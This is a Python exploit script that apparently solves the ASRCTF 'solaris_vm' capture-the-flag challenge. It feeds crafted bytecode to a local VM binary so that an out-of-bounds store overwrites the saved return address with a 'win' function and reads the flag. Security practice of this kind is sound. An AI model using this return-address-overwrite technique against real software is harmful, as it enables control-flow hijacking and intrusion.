#!/usr/bin/env python3
"""Direct test: single-slot exploit with win+1 for alignment fix."""
import subprocess
import struct
import sys
import os
import threading

OP_LI    = 3
OP_STORE = 5
OP_JLT   = 8
OP_INPUT = 9
OP_HALT  = 10

def asm_inst(op, dst, src1, src2, imm):
    return struct.pack("<BBBBq", op, dst, src1, src2, imm)

def main():
    chal_path = r"d:\USB\Nuke Test Field\ASRCTF challs\solaris_vm\src\chal.exe"
    flag_dir = r"d:\USB\Nuke Test Field\ASRCTF challs\solaris_vm\src"
    
    # Ensure flag.txt exists
    flag_path = os.path.join(flag_dir, "flag.txt")
    if not os.path.exists(flag_path):
        with open(flag_path, "w") as f:
            f.write("ASRCTF{test_flag_solaris_vm_pwned}")
        print(f"[*] Created test flag at {flag_path}")
    
    rip_idx = 269
    win_addr = 0x1400014d5  # win+1: skip push rbp for alignment

    # Single-slot exploit
    code  = asm_inst(OP_LI, 1, 0, 0, 256)
    code += asm_inst(OP_INPUT, 0, 0, 0, 0)
    code += asm_inst(OP_LI, 2, 0, 0, win_addr)
    code += asm_inst(OP_JLT, 0, 1, 0, 5)
    code += asm_inst(OP_STORE, 0, 2, 0, 0)
    code += asm_inst(OP_HALT, 0, 0, 0, 0)

    count = len(code) // 12
    stdin_data = f"{count}\n".encode() + code + f"{rip_idx}\n".encode()
    
    print(f"[*] Writing win+1={hex(win_addr)} to data_mem[{rip_idx}]")
    
    proc = subprocess.Popen(
        [chal_path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=flag_dir,
        bufsize=0
    )
    
    proc.stdin.write(stdin_data)
    proc.stdin.close()
    
    def read_stdout():
        while True:
            line = proc.stdout.readline()
            if not line:
                break
            print(f"[OUT] {line.decode(errors='ignore').rstrip()}")
            sys.stdout.flush()
    
    t = threading.Thread(target=read_stdout, daemon=True)
    t.start()
    t.join(timeout=5)
    
    if proc.poll() is None:
        print(f"[*] Process still running after 5s, killing...")
        proc.kill()
        proc.wait()
    
    print(f"\n[*] Exit code: {proc.returncode}")
    stderr_data = proc.stderr.read()
    if stderr_data:
        print(f"[*] Stderr: {stderr_data.decode(errors='ignore')}")

if __name__ == "__main__":
    main()
